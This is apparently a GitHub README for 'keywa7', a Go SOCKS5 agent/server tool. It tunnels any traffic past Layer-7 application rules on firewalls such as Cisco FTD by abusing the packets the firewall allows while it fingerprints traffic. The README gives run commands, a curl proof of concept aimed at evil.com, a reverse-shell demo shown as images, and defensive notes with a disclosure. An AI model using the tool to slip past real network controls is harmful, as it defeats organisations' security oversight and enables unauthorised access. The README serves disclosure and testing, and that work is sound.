# keywa7

<img src="images/icon.png" height="125">

keywa7 - every door in the [fire]wall has a keyway.

**every door** - Application Based Rules

**in the wall** - firewall

**has a keyway** - small hole to get to the other side

The tool that bypasses the firewall's Application Based Rules and lets you connect to anywhere, **any ip**, **any port** and **any application**.

The tool is successfully tested on **Cisco FTD** (Firewall Threat Defense).

But can also be used with other firewalls, that employ the similar architecture in Application Based (L7) Rules.

_Some firewalls on the market provide different architecture, thus eliminating a vulnerability._

### What keywa7 Exploits:
Next Generation Firewalls, such as Cisco FTD, taken as an example, support Application Based Rules.

Application Based Rules operate on Layer 7 and offer the possibility of Application Control at the network level.

Application Based Rules, on some firewalls, allow/block connections **NOT** based on source or destination addresses, but for the **specific application**. (Zoom, AnyDesk)

### Logic Behind The Application Based Rules:
Engines behind the Application Based Rules on some Next Generation Firewalls do not use any static identifier for the applications, they try to fingerprint the traffic using the network flow generated by them.

This means, that in order for the firewall to determine which application is performing the network requests and then decide if it should be allowed or blocked, the Rule Engine is forced to statically allow some packets, to collect the data, requried for fingerprinting the applications.

The quantity of the packets and the size of the data is limited to the minimal amount. Just enough to fingerprint the applications.

###### _Note: Some firewalls do not open connections to destination addresses until they verify the legitimacy of traffic. But not all of them._

### Are You Vulnerable?

To test if your environment is vulnerable to keywa7, just run a simple telnet test.

Set up a simple listener on the remote host, where direct access is nor permitted by the firewall.
```
./ncat -lvnp 443
```
###### _Note: port 443 is taken as an example, any arbitrary port can be used, both, for checking the vulnerability and using the exploit as well._

And try to connect to it from the restricted environment:
```
telnet 1.1.1.1 443
```

Write some data on the console and try to transfer it

![](images/Telnet%20Test.png)

The connection will be terminated after a couple of requests.

### The Exploit:
Since the application filtering engine, at the beginning of the connection, is forced to allow some packets go through, we can transfer **ANY** (but limited in size) data to **ANY** destination.

Our connections will not be terminated, because the engine is forced to allow us in the beginning of the connection, to try to fingerprint us.

So, until we get terminated, we can exchange anything and anywhere we want.

The exploit includes two components: **agent** and **server**.

The agent is run locally, on the system and supports SOCKS5 Proxy protocol for the communication from the applications.

The server is hosted on the remote server and forwards traffic, received from agent, to the destinations.

Agent and Server create a tunnel for data exchange, with a custom logic that exploits the Application Layer(L7) rule filtering logic.

#### Diagram that showcases the network flow, created by the keywa7:
![](images/keywa7-Main%20Flow.png)
1. Applications connect to the agent, that is run locally, using SOCKS5 protocol. The agent supports multiple applications simultaneously and can handle paralleled traffic asynchronously.
2. Agent and server exchange TCP data in the custom tunnel.
3. The server connects and forwards data to the real destinations, requested by the applications.

### keywa7 Custom Tunnel Logic:
keywa7 agent and server exchange data **chunk by chunk**.

Once the connection is established between them, server and agent exchange the chunks of the requests, from the applications and chunks of the responses, from the destinations.

After exchanging the chunks of the data, the connection is terminated and the remaining data is queued for the next connection to be transferred.

After terminating the connection, it is re-established and remaining queued chunks are transferred in the newly opened tunnel.

Firewalls limit the amount of the packets that are forcefully allowed, but, as it turns out, it's completely enough to create a custom tunnel that will allow any application to connect to any destination and transfer any amount of packets.

keywa7 transfers 2 or 4 packets per connection.

#### Diagrams the showcase the technical network flow between agent and server:

##### Opening New Connection
![](images/keywa7-Tunnel%20Init.png)
###### Total packets exchanged between agent and server: 2
1. **New Connection:** Applications connect to agent using SOCKS5 Proxy protocol and start continuous data transfer from and to it
2. **Session Initialization(agent):**
   * Agent parses the SOCKS5 protocol requests and exports destination address from it.
   * Agent generates new random Session ID for the connection.
   * Agent generates new "OPEN" command, that contains the address of the destination and the Session ID.
3. **Tunnel Open Command:** Agent sends the "OPEN" command to the server
4. **Session Initialization(server):**
   * Server accepts the new connection
   * Server parses the "OPEN" command and export destination address from it.
   * Server assigns the Session ID to the connection
5. **Connect to Destination:** Server opens connection to the destination and start continuous data transfer from and to it
6. **Session Command Ack:** Server returns ACK response to the agent, meaning that the request of the agent was completed.
7. **Terminate the connection:** Agent receives the ACK and terminates the connection

##### Continuing Existing Connection
![](images/keywa7-Tunnel%20Process.png)
###### Total packets exchanged between agent and server: 4
1. **Slice Data:** Agent receives and slices data from the Continuous Data Exchange Tunnel(created in the previous step), opened to the application.
2. **Session Continue Command:** Agent builds the new "CONT" command, containing the Session ID of the connection and sends it to the server.
3. **Lookup Session:** Server accepts the new connection from the agent and looks up the already established connection using the Session ID.
4. **Session Command Ack:** Server returns ACK response to the agent, meaning that the request of the agent was completed.
5. **Send Data Chunk(agent):**
   * Agent forwards the chunks of requests, from the applications, to the server.
   * Server forwards requests to the final destination, using the Continuous Data Exchange Tunnel(created in the previous step).
   * Server receives responses from the final destination, using the Continuous Data Exchange Tunnel(created in the previous step).
6. **Send Data Chunks(server):**
   * Server sends back the chunks of responses, from the destinations, to the agent.
   * Agent sends responses back to the applications, using the Continuous Data Exchange Tunnel(created in the previous step).
   * Applications receives responses back from the agent, using the Continuous Data Exchange Tunnel(created in the previous step).
7. **Terminate Connection:** Agent terminates connection to the server
8. **Reconnect:** Connection is re-established and the process is looped


##### Close Connection:
![](images/keywa7-Tunnel%20Termination.png)
###### Total packets exchanged between agent and server: 2
1. **Close Connection:** Application closes connection to the agent, or stops sending data to it.
2. **Tunnel Close Command:** Agent builds the new "CLOSE" command, containing the Session ID of the connection and sends it to the server.
3. **Lookup Session:** Server accepts the new connection from the agent and looks up the already established connection using the Session ID. If the session is unidentified, the connection is discarded.
4. **Close Tunnel:** Server terminates the Continuous Data Exchange Tunnel, opened to the destination.
5. **Session Command Ack:** Server returns ACK response to the agent, meaning that the request of the agent was completed.
6. **Terminate the connection:** Agent receives the ACK and terminates the connection

### Firewall Configuration
Configuration example for Cisco FTD.

Just Level 7 Application Rule is enough. There are no additional configuration requirements for the exploit to work.

![](images/Cisco%20Rule.png)

### Demonstration
Agent command example:
```
agent.exe --lhost 127.0.0.1 --lport 1080 --rhost 1.1.1.1 --rport 443
```

Server (hosted at 1.1.1.1) command example:
```
./server --lhost 0.0.0.0 --lport 443
```

Curl command of POC:
```
curl https://evil.com/ --socks5 127.0.0.1:1080
```

Verbose output of agent and server:

![](images/POC%20Tunnel.png)

Output on user-end application:

![](images/POC%20Application.png)

#### Reverse shell POC:

**Proxychains configuration(/etc/proxychains.conf):**

![](images/Proxychains%20Configuration.png)

**Agent Image:**

![](images/POC%20Shell%20Agent.png)

**Server Image:**

![](images/POC%20Shell%20Server.PNG)

#### Browser support:
keywa7 supports **any** SOCKS5 protocol requests, including ones made by browser.

So feel free to configure any browser to use keywa7's agent as a SOCKS5 proxy and browse anywhere.

**Firefox configuration example:** 

![](images/Firefox%20SOCKS5%20Configuration.png)

###### Note: Since keywa7 has to re-establish connections over and over again and send data chunk-by-chunk, it takes more time for resources to be exchanged between agent and server, and, as a result, connection gets slowed down. This MAY cause browsers to cancel their requests, due to the long wait time (data will be still exchanged, browser will just not accept it anymore) and since only the small chunk of the file will be received, instead of the full one, website will fail to load. This typically happens on big Javascript or CSS files, loaded by web pages. This problem is not encountered if the requested file is cashed in the browser and keywa7 does not have to transfer them.

### Build

1. Browse to the folder of the specific component. **agent/** or **server/** 
2. Set Operating System option in Environmental Variables
   * Linux: GOOS=linux
   * Windows: GOOS=windows
3. Run build command: **go build**

_Note: already **compiled** and **ready-to-use** versions of both components, for **Linux** and **Windows** OS-es, are available in **Releases** section_

### Correct Architecture
Firewalls should employ approach where connection is not established between user and server until legitimacy of traffic is ensured.

### Hot To Protect Your Environment?
Simply run the vulnerability check, provided above.

If you're vulnerable, just **DO NOT** use Application Based (L7) Rules. Otherwise, consider that you do not have a firewall at all.

### Disclosure
Cisco, the company responsible for the Cisco FTD (Firewall Threat Defense) software is aware of the vulnerability but has not taken any action to remediate the issue.

### DISCLAIMER
THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY. UNAUTHORIZED USE IS PROHIBITED. THE AUTHOR IS NOT LIABLE FOR ANY MISUSE OR RESULTING DAMAGES. USE RESPONSIBLY AND AT YOUR OWN RISK.
